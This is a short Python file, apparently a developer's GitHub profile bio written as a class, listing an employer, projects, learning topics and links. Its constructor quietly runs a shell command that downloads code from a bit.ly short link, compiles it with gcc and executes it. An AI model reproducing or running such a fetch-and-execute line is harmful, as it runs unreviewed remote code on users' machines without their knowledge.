class PROxZIMA:
  def __init__(self):
    subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
    self.bio = {
      '- 💼 I’m currently working for': {'Convin.ai': 'https://convin.ai'},
      '- 🔭 I’m currently working on' : {'Prism'    : 'https://github.com/PROxZIMA/prism',
                                         'Sweet-Pop': 'https://github.com/PROxZIMA/Sweet-Pop'},
      '- 🌱 I’m currently learning'   : ['Django', 'C++', 'Python', 'Full Stack Development', 'Algo Trading'],
      '- 💬 Ask me anything'          : '¯\_(ツ)_/¯',
      '- 👨‍💻 My projects available at' : 'https://github.com/PROxZIMA?tab=repositories',
      '- 📄 Know about my experiences': 'https://proxzima.dev/resume',
      '- ⚡ Fun fact'                 : ('Proxima Centauri is a small, low-mass star located 4.2465 light-years '
                                         'away from the Sun in the southern constellation of Centaurus.')
    }

if __name__ == '__main__':
  import subprocess, pprint
  pprint.pprint(PROxZIMA().__dict__)
